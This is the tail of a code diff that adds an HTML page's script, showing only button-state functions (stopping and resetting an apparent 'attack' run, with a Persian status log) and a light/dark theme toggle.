+        function stopAttack() {
+            stopFlag = true;
+            log('🛑 توقف توسط کاربر');
+            document.querySelector('.btn-stop').disabled = true;
+        }
+
+        function resetButtons() {
+            document.querySelector('.btn-start').disabled = false;
+            document.querySelector('.btn-stop').disabled = true;
+        }
+
+        function toggleTheme() {
+            document.body.classList.toggle('light');
+            document.body.classList.toggle('dark');
+        }
+    </script>
+</body>
+</html>
